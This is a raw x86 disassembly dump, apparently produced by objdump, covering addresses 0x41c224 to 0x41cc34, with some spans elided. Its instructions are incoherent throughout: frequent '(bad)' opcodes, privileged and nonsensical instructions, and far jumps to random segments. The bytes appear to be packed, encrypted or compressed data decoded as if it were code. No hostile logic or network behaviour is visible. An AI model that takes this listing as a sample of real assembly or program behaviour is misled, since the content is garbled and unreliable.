  41c224:	mov    ah,0x95
  41c226:	xchg   ebp,eax
  41c227:	mov    dh,0xbd
  41c229:	ja     0x41c1fa
  41c22b:	aaa    
  41c22c:	(bad)  
  41c22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c22e:	xlat   BYTE PTR ds:[ebx]
  41c22f:	mov    bl,0x63
  41c231:	jmp    0x588f:0xdda1ea43
  41c238:	(bad)  
  41c239:	or     eax,DWORD PTR ds:[edx]
  41c23c:	cmc    
  41c23d:	mov    ch,0x81
  41c23f:	in     al,dx
  41c240:	jmp    FWORD PTR [ebx]
  41c242:	pop    edx
  41c243:	fs retf 0x878b
  41c247:	aad    0x71
  41c249:	mov    al,ds:0x83290c93
  41c24e:	push   esp
  41c24f:	mov    ds,WORD PTR [esi]
  41c251:	nop
  41c252:	dec    edi
  41c253:	btr    DWORD PTR [ecx-0x47fa476],ebx
  41c25a:	mov    dl,0x7d
  41c25c:	dec    edi
  41c25d:	aaa    
  41c25e:	popf   
  41c25f:	ds mov ebx,0x111ada27
  41c265:	xchg   edi,eax
  41c266:	enter  0xaab,0xfc
  41c26a:	jle    0x41c2bb
  41c26c:	xchg   esi,eax
  41c26d:	inc    eax
  41c26e:	repz add BYTE PTR [edi+0xa],0x36
  41c273:	mov    ?,WORD PTR [edx+0x463d42ee]
  41c279:	in     al,0xeb
  41c27b:	xchg   ebx,eax
  41c27c:	fucomi st,st(2)
  41c27e:	mov    eax,ds:0xb9b4fa9
  41c283:	push   0x25c50b3
  41c288:	mov    ds:0x8392fc81,eax
  41c28d:	aas    
  41c28e:	sahf   
  41c28f:	or     eax,0x0
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	jo     0x41c30a
  41c302:	inc    ebx
  41c303:	xchg   edx,eax
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	mov    al,0xc
  41c30e:	add    edi,eax
  41c310:	popf   
  41c311:	inc    esi
  41c312:	sub    DWORD PTR [eax-0x1],eax
  41c315:	sub    al,0x66
  41c317:	(bad)  
  41c318:	arpl   dx,cx
  41c31a:	sub    ebp,DWORD PTR [ebx-0x77]
  41c31d:	(bad)  
  41c31e:	xlat   BYTE PTR ds:[ebx]
  41c31f:	loop   0x41c2c7
  41c321:	daa    
  41c322:	mov    al,ds:0x328c71f7
  41c327:	inc    esi
  41c328:	push   eax
  41c329:	adc    BYTE PTR [edx-0x59b5942a],dl
  41c32f:	pop    edx
  41c330:	adc    ebp,DWORD PTR [eax+0x24d511ab]
  41c336:	gs cvttps2pi mm2,xmm7
  41c33a:	cmp    al,0x38
  41c33c:	inc    esi
  41c33d:	ins    DWORD PTR es:[edi],dx
  41c33e:	lods   al,BYTE PTR ds:[esi]
  41c33f:	mov    ebx,0x78aa636e
  41c344:	out    0xf7,al
  41c346:	and    ebp,eax
  41c348:	xchg   ebp,eax
  41c349:	xor    BYTE PTR [eax+0x50],cl
  41c34c:	jb     0x41c348
  41c34e:	loop   0x41c3b8
  41c350:	mov    esi,0x26e387e8
  41c355:	pusha  
  41c356:	xchg   esp,eax
  41c357:	xchg   cx,ax
  41c359:	lds    ebx,FWORD PTR [edx+eiz*1+0x5c6acae6]
  41c360:	out    dx,eax
  41c361:	push   edx
  41c362:	pop    edx
  41c363:	sar    DWORD PTR [ebp-0x2e],0xb1
  41c367:	in     eax,dx
  41c368:	sbb    al,BYTE PTR [ecx+0x35407a7f]
  41c36e:	jnp    0x41c383
  41c370:	aam    0x43
  41c372:	fisttp DWORD PTR [edi-0x45abff26]
  41c378:	push   esp
  41c379:	push   ebx
  41c37a:	mov    al,0x7
  41c37c:	push   esp
  41c37d:	ficom  WORD PTR [esi-0x52]
  41c380:	arpl   di,sp
  41c382:	adc    eax,0xe8c79eb1
  41c387:	sub    al,0xc0
  41c389:	mov    esp,DWORD PTR [esi]
  41c38b:	dec    eax
  41c38c:	test   DWORD PTR [edi],ecx
  41c38e:	and    BYTE PTR [ecx],ch
  41c390:	loop   0x41c31c
  41c392:	mov    eax,0xa287dc81
  41c397:	cmp    BYTE PTR [ebp-0x131ba97d],0xa0
  41c39e:	je     0x41c3e2
  41c3a0:	idiv   DWORD PTR [edx]
  41c3a2:	add    DWORD PTR [ecx+0x62],ecx
  41c3a5:	repz into 
  41c3a7:	pop    ecx
  41c3a8:	mov    eax,0x8911857f
  41c3ad:	inc    dl
  41c3af:	mov    bh,0xba
  41c3b1:	popa   
  41c3b2:	mov    ?,WORD PTR [eax+0x69e8e230]
  41c3b8:	imul   edi,edi,0xffffffe3
  41c3bb:	adc    ebp,edx
  41c3bd:	sbb    esi,0x51523c8f
  41c3c3:	adc    eax,0x406381ff
  41c3c8:	pcmpeqb mm2,QWORD PTR [edi]
  41c3cb:	ins    DWORD PTR es:[edi],dx
  41c3cc:	dec    edx
  41c3cd:	sysret 
  41c3cf:	aam    0x3b
  41c3d1:	aaa    
  41c3d2:	cmp    DWORD PTR [ebp-0x395f6c9c],edi
  41c3d8:	pusha  
  41c3d9:	lds    edi,FWORD PTR [ecx+edi*1-0x43179892]
  41c3e0:	dec    eax
  41c3e1:	add    bh,BYTE PTR ds:0x7e824032
  41c3e7:	dec    eax
  41c3e8:	js     0x41c3f3
  41c3ea:	jb     0x41c396
  41c3ec:	sub    ecx,ebx
  41c3ee:	sub    eax,0xb5c75b7b
  41c3f3:	or     esi,DWORD PTR [ecx+eiz*8-0x34eb5725]
  41c3fa:	sar    DWORD PTR [ebp-0x22],1
  41c3fd:	cwde   
  41c3fe:	ret    
  41c3ff:	test   eax,0xc9deb4dc
  41c404:	cmp    ebp,DWORD PTR [ecx+0x32]
  41c407:	sub    ch,BYTE PTR [ebp+0x27125f21]
  41c40d:	daa    
  41c40e:	sbb    dl,BYTE PTR [ecx+0x0]
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	data16 je 0x41c48e
  41c483:	push   esi
  41c484:	inc    eax
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	(bad)  
  41c48d:	cmc    
  41c48e:	push   edi
  41c48f:	mov    al,0x69
  41c491:	lods   eax,DWORD PTR ds:[esi]
  41c492:	add    DWORD PTR [ebp-0x4f],esi
  41c495:	dec    ebp
  41c496:	jecxz  0x41c508
  41c498:	les    esp,FWORD PTR [ecx-0x2d7019aa]
  41c49e:	test   eax,0xc4cce30f
  41c4a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4a4:	outs   dx,BYTE PTR ds:[esi]
  41c4a5:	cdq    
  41c4a6:	sbb    BYTE PTR [eax+esi*4],0x80
  41c4aa:	sub    al,0x7d
  41c4ac:	xor    al,dh
  41c4ae:	lock dec eax
  41c4b0:	iret   
  41c4b1:	xor    dl,BYTE PTR [esi-0x3b]
  41c4b4:	std    
  41c4b5:	fcom   QWORD PTR [edx-0x23a88fa7]
  41c4bb:	mov    cr7,ebp
  41c4be:	or     dl,ch
  41c4c0:	push   edi
  41c4c1:	cli    
  41c4c2:	jg     0x41c53f
  41c4c4:	loope  0x41c53d
  41c4c6:	or     BYTE PTR [ebp+eax*8+0x6dbdbf25],dl
  41c4cd:	daa    
  41c4ce:	inc    ebp
  41c4cf:	mov    al,ds:0x2f9b1219
  41c4d4:	loop   0x41c53b
  41c4d6:	in     eax,dx
  41c4d7:	mov    BYTE PTR [edi+0x5e],bh
  41c4da:	fwait
  41c4db:	pop    ebp
  41c4dc:	jb     0x41c4d7
  41c4de:	jecxz  0x41c557
  41c4e0:	imul   esp,DWORD PTR [ebp-0x28fe3028],0xffffffdb
  41c4e7:	jg     0x41c50d
  41c4e9:	pop    es
  41c4ea:	dec    ebx
  41c4eb:	pop    eax
  41c4ec:	pop    edi
  41c4ed:	pop    ds
  41c4ee:	or     edi,DWORD PTR [ebp+0x6b]
  41c4f1:	retf   
  41c4f2:	pop    eax
  41c4f3:	sti    
  41c4f4:	xor    eax,0x12d3e4b3
  41c4f9:	sahf   
  41c4fa:	lds    esp,FWORD PTR [esp+ebp*1]
  41c4fd:	lahf   
  41c4fe:	mov    bh,0x1e
  41c500:	xchg   ebp,eax
  41c501:	and    al,0x62
  41c503:	fldcw  WORD PTR [ebp+edx*1-0xe]
  41c507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c508:	pop    ebx
  41c509:	xchg   esp,eax
  41c50a:	jecxz  0x41c4ad
  41c50c:	or     ebx,DWORD PTR [edi-0x73]
  41c50f:	test   eax,0xfd0bec9c
  41c514:	mov    bh,0xd0
  41c516:	mov    ch,0x89
  41c518:	sar    BYTE PTR [edi-0x13],0x41
  41c51c:	pop    esp
  41c51d:	fisttp QWORD PTR [esp+ebx*4+0x4106491d]
  41c524:	pushf  
  41c525:	test   eax,0x846b3eef
  41c52a:	cmc    
  41c52b:	and    ah,ah
  41c52d:	ins    DWORD PTR es:[edi],dx
  41c52e:	lahf   
  41c52f:	xchg   ebx,eax
  41c530:	mov    ebp,0xf88d7717
  41c535:	addr16 mov dl,0xae
  41c538:	mov    edx,edx
  41c53a:	mov    ah,0x5b
  41c53c:	sub    dh,BYTE PTR [esi]
  41c53e:	add    eax,0xcb01c702
  41c543:	jo     0x41c5c2
  41c545:	adc    eax,0x41db73
  41c54a:	mov    ch,0x6f
  41c54c:	mov    bh,BYTE PTR [ebp-0x63766e28]
  41c552:	mul    BYTE PTR [edx]
  41c554:	xchg   ebx,eax
  41c555:	(bad)  
  41c556:	lods   eax,DWORD PTR ds:[esi]
  41c557:	jnp    0x41c57c
  41c559:	jg     0x41c584
  41c55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c55c:	pop    ss
  41c55d:	sbb    DWORD PTR [ecx],esp
  41c55f:	fbstp  TBYTE PTR [ecx-0x49752249]
  41c565:	test   eax,0x47d3ba03
  41c56a:	(bad)  
  41c56b:	repz test al,0xf4
  41c56e:	sub    DWORD PTR [ecx-0x38],eax
  41c571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c572:	mov    edi,0x9ee331d9
  41c577:	push   0xb773de2b
  41c57c:	jbe    0x41c4fe
  41c57e:	repnz jecxz 0x41c5be
  41c581:	cmp    al,BYTE PTR [esi+0x3a431a25]
  41c587:	cdq    
  41c588:	and    dh,ah
  41c58a:	add    DWORD PTR [ecx-0x63],eax
  41c58d:	mov    ah,BYTE PTR [edi+0x39]
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0xc1027459
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	pop    esp
  41c60d:	xchg   BYTE PTR [ebp+0x293cd72f],ch
  41c613:	clc    
  41c614:	pop    edi
  41c615:	fist   WORD PTR [edx+ebp*2+0x14dddf1a]
  41c61c:	cmp    edi,DWORD PTR [esi+0x1]
  41c61f:	fadd   st,st(7)
  41c621:	cs dec ebp
  41c623:	aad    0x99
  41c625:	in     al,0xc5
  41c627:	(bad)  
  41c628:	aas    
  41c629:	rcr    BYTE PTR [edi+0x1557fe93],1
  41c62f:	add    al,0x2f
  41c631:	push   edx
  41c632:	repz cmp eax,0xd845b0bf
  41c638:	mov    BYTE PTR [ebp+0x32],bl
  41c63b:	push   fs
  41c63d:	jecxz  0x41c5c4
  41c63f:	ror    ebx,cl
  41c641:	rcr    DWORD PTR [ebp+ebx*8+0x14],cl
  41c645:	retf   0x9cff
  41c648:	imul   esp,DWORD PTR [edx+0xf3cf035],0x5349c643
  41c652:	adc    al,0x5a
  41c654:	je     0x41c669
  41c656:	dec    ecx
  41c657:	pop    esi
  41c658:	or     BYTE PTR [eax+0x30],0xb5
  41c65c:	and    al,0x1d
  41c65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c65f:	sbb    dl,al
  41c661:	and    eax,0xa26a51fd
  41c666:	or     BYTE PTR [eax],al
  41c668:	neg    BYTE PTR [edi]
  41c66a:	in     al,0x1
  41c66c:	push   dx
  41c66e:	xor    eax,0xb1350f5c
  41c673:	ret    
  41c674:	rcl    BYTE PTR [ebx-0x1f74413d],cl
  41c67a:	gs das 
  41c67c:	mov    al,ds:0xfdf09d0b
  41c681:	outs   dx,DWORD PTR ds:[esi]
  41c682:	lds    ecx,FWORD PTR ds:0x524ca067
  41c688:	pop    esi
  41c689:	mov    dl,0x8b
  41c68b:	push   0xcabdd27f
  41c690:	push   ecx
  41c691:	push   0xffffffd1
  41c693:	dec    eax
  41c694:	pop    edi
  41c695:	jne    0x41c712
  41c697:	sbb    BYTE PTR [esi-0x4f],0xe9
  41c69b:	popa   
  41c69c:	mov    eax,0x5e38922b
  41c6a1:	jns    0x41c6b3
  41c6a3:	iret   
  41c6a4:	and    edi,DWORD PTR [ebp-0x58]
  41c6a7:	hlt    
  41c6a8:	dec    edx
  41c6a9:	retf   
  41c6aa:	jbe    0x41c636
  41c6ac:	pop    ebp
  41c6ad:	add    eax,0xd8612d00
  41c6b2:	test   BYTE PTR [edx],cl
  41c6b4:	popa   
  41c6b5:	push   cs
  41c6b6:	cmp    dl,BYTE PTR ds:0x6232cc2b
  41c6bc:	xor    eax,edx
  41c6be:	push   edi
  41c6bf:	sbb    eax,0xb881b0ac
  41c6c4:	jno    0x41c693
  41c6c6:	aas    
  41c6c7:	repnz iret 
  41c6c9:	ret    0xb5ac
  41c6cc:	shl    DWORD PTR [esi],cl
  41c6ce:	fs adc ebx,edx
  41c6d1:	adc    ch,BYTE PTR [edx+0x27]
  41c6d4:	sub    DWORD PTR [esi+0x76],edx
  41c6d7:	sub    eax,0x1749ae4a
  41c6dc:	jp     0x41c6b0
  41c6de:	(bad)  
  41c6df:	sub    ah,BYTE PTR [eax]
  41c6e1:	cs ja  0x41c6ec
  41c6e4:	out    0x1c,al
  41c6e6:	dec    ecx
  41c6e7:	dec    edx
  41c6e8:	push   0xffffffd5
  41c6ea:	xchg   BYTE PTR [ebx+edi*1+0xd3f43ff],bl
  41c6f1:	dec    eax
  41c6f2:	or     BYTE PTR [ebx+edi*2],cl
  41c6f5:	push   0x7da3db25
  41c6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fb:	test   al,0x4c
  41c6fd:	push   0x253521e4
  41c702:	and    edi,ebp
  41c704:	mov    al,0x41
  41c706:	dec    eax
  41c707:	rol    BYTE PTR [eax],0xcd
  41c70a:	xor    cl,BYTE PTR [ebx]
  41c70c:	bnd call 0x41cd1e
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	js     0x41c702
  41c782:	inc    ecx
  41c783:	and    al,0x48
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	jecxz  0x41c759
  41c78e:	mov    ah,0xe9
  41c790:	dec    ecx
  41c791:	mov    dl,0x43
  41c793:	gs test al,0x18
  41c796:	jbe    0x41c71a
  41c798:	in     eax,dx
  41c799:	mov    edx,0x3534d41f
  41c79e:	sub    bl,0x67
  41c7a1:	and    al,0xa8
  41c7a3:	sbb    eax,DWORD PTR [ecx-0x6707b463]
  41c7a9:	not    DWORD PTR [edx+0x2fdc8b19]
  41c7af:	mov    al,ds:0x38720046
  41c7b4:	sti    
  41c7b5:	add    ebp,DWORD PTR [edi]
  41c7b7:	hlt    
  41c7b8:	xrelease mov BYTE PTR [edi-0x65],dh
  41c7bc:	test   DWORD PTR [ecx+0x309fb23],edi
  41c7c2:	in     eax,0xf8
  41c7c4:	nop
  41c7c5:	mov    bl,0x4d
  41c7c7:	sub    BYTE PTR [eax+0x1c783400],0x6d
  41c7ce:	mov    esp,0x95c484d8
  41c7d3:	or     al,0x0
  41c7d5:	cmp    DWORD PTR [ebp-0x792d2d8c],edi
  41c7db:	pop    edi
  41c7dc:	push   ebx
  41c7dd:	sbb    al,0x70
  41c7df:	inc    ebp
  41c7e0:	add    eax,0x5428e5b1
  41c7e5:	adc    BYTE PTR [edi],0x8
  41c7e8:	fisubr WORD PTR [esi]
  41c7ea:	inc    edi
  41c7eb:	pop    esp
  41c7ec:	and    eax,0xfdc676f9
  41c7f1:	adc    al,0x58
  41c7f3:	mov    ebx,0xb3629f49
  41c7f8:	and    ah,ch
  41c7fa:	jb     0x41c7b4
  41c7fc:	dec    edi
  41c7fd:	push   esp
  41c7fe:	xor    ecx,DWORD PTR [edx-0x7f]
  41c801:	xchg   ebx,eax
  41c802:	xor    esi,ebx
  41c804:	inc    ebx
  41c805:	add    BYTE PTR [edi],al
  41c807:	loop   0x41c877
  41c809:	mov    edx,0xe6392bda
  41c80e:	mov    ch,0xac
  41c810:	mov    ah,0xfb
  41c812:	dec    esp
  41c813:	(bad)  
  41c814:	jmp    0x41c7fa
  41c816:	xchg   BYTE PTR [esi+0x4be6ea35],bh
  41c81c:	inc    eax
  41c81d:	fmul   st,st(0)
  41c81f:	pop    ss
  41c820:	nop
  41c821:	mov    fs,WORD PTR [esi]
  41c823:	xchg   esp,eax
  41c824:	mov    bh,0x44
  41c826:	push   edi
  41c827:	jbe    0x41c7f9
  41c829:	ins    DWORD PTR es:[edi],dx
  41c82a:	and    DWORD PTR [edi+0xc2a30fe],esi
  41c830:	icebp  
  41c831:	in     eax,0xce
  41c833:	pop    edx
  41c834:	dec    edi
  41c835:	mov    ch,0x59
  41c837:	leave  
  41c838:	ds pop edx
  41c83a:	xchg   esi,eax
  41c83b:	test   DWORD PTR [esi-0x48],ebx
  41c83e:	aaa    
  41c83f:	outs   dx,DWORD PTR ds:[esi]
  41c840:	and    eax,edi
  41c842:	imul   DWORD PTR [esi+0x52d1ea49]
  41c848:	dec    edx
  41c849:	jmp    0x1fcacaab
  41c84e:	push   esp
  41c84f:	mov    bl,0xe
  41c851:	or     eax,DWORD PTR [ebx+eiz*2+0x403afc53]
  41c858:	outs   dx,BYTE PTR ds:[esi]
  41c859:	or     eax,0x718ab3ae
  41c85e:	mov    edi,0xad1e3b63
  41c863:	imul   BYTE PTR [ecx+0x55acabd0]
  41c869:	loopne 0x41c876
  41c86b:	mov    ds:0xb687d010,al
  41c870:	(bad)  
  41c871:	sub    BYTE PTR ds:0x4282ad1,ah
  41c877:	fxch   st(4)
  41c879:	mov    ebx,0xa6c07a3a
  41c87e:	dec    ah
  41c880:	into   
  41c881:	nop
  41c882:	aaa    
  41c883:	arpl   WORD PTR [eax],di
  41c885:	cli    
  41c886:	xchg   ebx,eax
  41c887:	cmp    cl,BYTE PTR [ebx]
  41c889:	xchg   DWORD PTR [ebx-0x2a],ecx
  41c88c:	and    eax,0x5fbf5e
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	and    esi,esp
  41c902:	cmp    eax,0x12f4c5c
  41c907:	add    BYTE PTR [ecx+eax*1],al
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	mov    ah,0x36
  41c90e:	jb     0x41c959
  41c910:	adc    DWORD PTR [ebx],esi
  41c912:	call   0xe5ea:0x447664c3
  41c919:	retf   
  41c91a:	and    ebp,0xffffff99
  41c91d:	dec    esp
  41c91e:	dec    eax
  41c91f:	sbb    ah,bl
  41c921:	and    bl,bl
  41c923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c924:	xchg   ebp,eax
  41c925:	clc    
  41c926:	out    dx,eax
  41c927:	push   0x2c
  41c929:	loope  0x41c978
  41c92b:	icebp  
  41c92c:	repnz or BYTE PTR [esi+0x10],al
  41c930:	cmc    
  41c931:	or     dl,bh
  41c933:	ret    0x6e9b
  41c936:	addr16 out 0x1e,al
  41c939:	inc    edi
  41c93a:	xchg   esp,eax
  41c93b:	adc    eax,0x932806cc
  41c940:	iret   
  41c941:	arpl   WORD PTR [eax+0x6375d18f],di
  41c947:	and    al,BYTE PTR [eax-0x45e61e08]
  41c94d:	mov    dh,0x36
  41c94f:	and    al,0x14
  41c951:	imul   esp,DWORD PTR [ecx+edx*4-0x4a],0x20
  41c956:	loopne 0x41c9b9
  41c958:	js     0x41c93b
  41c95a:	test   DWORD PTR [edi-0x62],eax
  41c95d:	rcr    BYTE PTR [edi+0x39],0x61
  41c961:	arpl   di,bx
  41c963:	dec    edi
  41c964:	shr    dl,1
  41c966:	stos   DWORD PTR es:[edi],eax
  41c967:	cs (bad) 
  41c969:	shl    BYTE PTR [ecx-0x61],cl
  41c96c:	out    dx,al
  41c96d:	(bad)  
  41c96e:	lock jmp 0x41c8f9
  41c971:	dec    ebx
  41c972:	and    al,0x92
  41c974:	sbb    DWORD PTR [ebx-0x9724ea3],ebp
  41c97a:	mov    al,0x32
  41c97c:	sahf   
  41c97d:	mov    bh,0x9b
  41c97f:	imul   ecx,DWORD PTR [ebx],0xffffffb6
  41c982:	hlt    
  41c983:	aad    0x31
  41c985:	popf   
  41c986:	fsubp  st(6),st
  41c988:	ins    BYTE PTR es:[edi],dx
  41c989:	cld    
  41c98a:	xchg   esi,eax
  41c98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c98c:	jl     0x41c921
  41c98e:	jle    0x41c971
  41c990:	(bad)  
  41c991:	and    esi,DWORD PTR [edx+0x2173558f]
  41c997:	ret    
  41c998:	sub    eax,0xb214ec24
  41c99d:	(bad)  
  41c99e:	fdivr  st(3),st
  41c9a0:	icebp  
  41c9a1:	mov    BYTE PTR [edx+ebx*8-0x9],bl
  41c9a5:	mov    bh,0x4
  41c9a7:	pusha  
  41c9a8:	retf   0xc618
  41c9ab:	xlat   BYTE PTR ds:[ebx]
  41c9ac:	dec    esi
  41c9ad:	js     0x41c99b
  41c9af:	xchg   esi,eax
  41c9b0:	sbb    BYTE PTR [ebx],0x82
  41c9b3:	mov    al,0x15
  41c9b5:	xlat   BYTE PTR ds:[ebx]
  41c9b6:	pop    ss
  41c9b7:	jle    0x41c9d9
  41c9b9:	imul   ebp,ebp,0x5f30e061
  41c9bf:	shr    BYTE PTR [eax],1
  41c9c1:	mov    al,0xbe
  41c9c3:	and    eax,0x209216fc
  41c9c8:	or     BYTE PTR [edx-0x44],0xe6
  41c9cc:	push   esp
  41c9cd:	add    dh,BYTE PTR [ebx-0x53be926b]
  41c9d3:	(bad)  
  41c9d4:	data16 mov gs,WORD PTR es:[esi]
  41c9d8:	mov    ebx,0x2c397a6a
  41c9dd:	(bad)  
  41c9de:	pushf  
  41c9df:	ret    
  41c9e0:	mov    al,0xa
  41c9e2:	(bad)  
  41c9e3:	mov    al,0xac
  41c9e5:	push   esp
  41c9e6:	push   ebp
  41c9e7:	data16 retw 0xbf8e
  41c9ec:	xchg   DWORD PTR [ebx+eiz*4-0x4d],esp
  41c9f0:	retf   0x26cd
  41c9f3:	push   ebx
  41c9f4:	js     0x41ca5f
  41c9f6:	fisttp QWORD PTR [edx]
  41c9f8:	test   DWORD PTR [ecx-0x29],edi
  41c9fb:	pusha  
  41c9fc:	sbb    BYTE PTR [edx+0x32143088],0x5c
  41ca03:	imul   ebx,edx,0xf05e7a61
  41ca09:	call   0x82fd97ed
  41ca0e:	test   eax,0x6a
	...
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	and    ah,BYTE PTR [edx+eax*4+0x1305021]
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	adc    al,BYTE PTR [eax+0x6f4b0f3e]
  41ca92:	sub    eax,0xd7fb6ee5
  41ca97:	dec    edx
  41ca98:	cwde   
  41ca99:	gs xchg esp,eax
  41ca9b:	std    
  41ca9c:	jae    0x41cad6
  41ca9e:	sbb    ah,BYTE PTR [ebx+0x2d26e125]
  41caa4:	or     al,BYTE PTR [edx-0x2b]
  41caa7:	bound  esp,QWORD PTR [eax+0x48]
  41caaa:	comiss xmm4,DWORD PTR [ecx]
  41caad:	sbb    esp,DWORD PTR [ebp+esi*8-0x6df890c4]
  41cab4:	xor    dl,BYTE PTR [ebx+0x17]
  41cab7:	fs aam 0x5b
  41caba:	pusha  
  41cabb:	out    0xcf,al
  41cabd:	sbb    BYTE PTR [ebx+0x69],ch
  41cac0:	sbb    bl,al
  41cac2:	mov    ebx,0xe86bb5c4
  41cac7:	sahf   
  41cac8:	inc    ebp
  41cac9:	or     ebx,DWORD PTR [edx-0x63]
  41cacc:	stos   BYTE PTR es:[edi],al
  41cacd:	ret    
  41cace:	ins    DWORD PTR es:[edi],dx
  41cacf:	pop    ecx
  41cad0:	mov    cl,0xab
  41cad2:	and    al,0x3d
  41cad4:	xchg   ebp,edx
  41cad6:	cs inc esp
  41cad8:	xchg   DWORD PTR [ecx-0x59c6f051],eax
  41cade:	cmp    eax,0xb2c88c05
  41cae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae4:	ins    BYTE PTR es:[edi],dx
  41cae5:	iretw  
  41cae7:	enter  0xb9d0,0xa3
  41caeb:	inc    eax
  41caec:	dec    edi
  41caed:	xchg   edi,eax
  41caee:	std    
  41caef:	inc    ebx
  41caf0:	mov    WORD PTR [edx],?
  41caf2:	push   ds
  41caf3:	iret   
  41caf4:	frstor ds:0x422e67ce
  41cafa:	adc    esp,DWORD PTR [edx+0xc]
  41cafd:	or     DWORD PTR [ebp+0x5d],0xffffffb4
  41cb01:	lds    ecx,FWORD PTR [eax]
  41cb03:	pop    eax
  41cb04:	(bad)  
  41cb05:	into   
  41cb06:	xor    esp,ebx
  41cb08:	xchg   ebx,eax
  41cb09:	and    cl,BYTE PTR [eax-0x2]
  41cb0c:	xor    bl,BYTE PTR ds:0xc688f075
  41cb12:	jge    0x41cb46
  41cb14:	imul   BYTE PTR [eax+0x5f]
  41cb17:	mov    esi,0xf192823c
  41cb1c:	test   DWORD PTR [ecx+edx*4+0x12],edi
  41cb20:	xchg   esi,eax
  41cb21:	jmp    0x2768:0xb3800eed
  41cb28:	sar    ebx,1
  41cb2a:	or     al,0xf5
  41cb2c:	lods   al,BYTE PTR ds:[esi]
  41cb2d:	jbe    0x41cb91
  41cb2f:	cli    
  41cb30:	add    esp,edi
  41cb32:	mov    al,ds:0xb225dd93
  41cb37:	out    0xb3,al
  41cb39:	mov    ebx,0x82f9d0a7
  41cb3e:	std    
  41cb3f:	(bad)  
  41cb40:	push   ds
  41cb41:	lods   al,BYTE PTR ds:[si]
  41cb43:	jne    0x41cbbb
  41cb45:	imul   DWORD PTR [ecx+eiz*4+0x5c11709d]
  41cb4c:	pcmpeqb mm7,mm5
  41cb4f:	sub    cl,cl
  41cb51:	mov    ebp,DWORD PTR [ecx+0x50]
  41cb54:	inc    ecx
  41cb55:	and    dl,ch
  41cb57:	xchg   edi,eax
  41cb58:	sub    ebx,DWORD PTR [edx]
  41cb5a:	sar    DWORD PTR ds:0x5bcf4f23,1
  41cb60:	mov    WORD PTR [edx+0x78],ss
  41cb63:	push   esi
  41cb64:	cmc    
  41cb65:	pushw  cs
  41cb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb68:	sub    al,0x90
  41cb6a:	pushf  
  41cb6b:	ret    
  41cb6c:	add    ebx,DWORD PTR [ebp+eax*1+0x7652b60]
  41cb73:	(bad)  
  41cb74:	out    0xd8,eax
  41cb76:	pop    ebx
  41cb77:	push   ebp
  41cb78:	pop    edx
  41cb79:	or     dl,dh
  41cb7b:	(bad)  
  41cb7c:	retf   
  41cb7d:	and    eax,0x63c5328a
  41cb82:	in     eax,0xba
  41cb84:	and    BYTE PTR [edi-0xeb844b4],0x73
  41cb8b:	jbe    0x41cb41
  41cb8d:	mov    bl,bl
  41cb8f:	into   
	...
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xebaf622
  41cc03:	andps  xmm6,XMMWORD PTR [ecx]
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    al,0x1
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	adc    eax,0x8c384ebf
  41cc11:	add    cl,dh
  41cc13:	jo     0x41cb9c
  41cc15:	push   ecx
  41cc16:	or     BYTE PTR [esi+0x7],ah
  41cc19:	mov    edi,0xf0f6bdf7
  41cc1e:	test   DWORD PTR [ecx-0x18c1c0d8],ecx
  41cc24:	sub    bh,ch
  41cc26:	mov    esi,0xded78ffe
  41cc2b:	jns    0x41cbf6
  41cc2d:	daa    
  41cc2e:	pop    ss
  41cc2f:	(bad)  
  41cc30:	data16 arpl si,sp
  41cc33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc34:	ret    0xd164
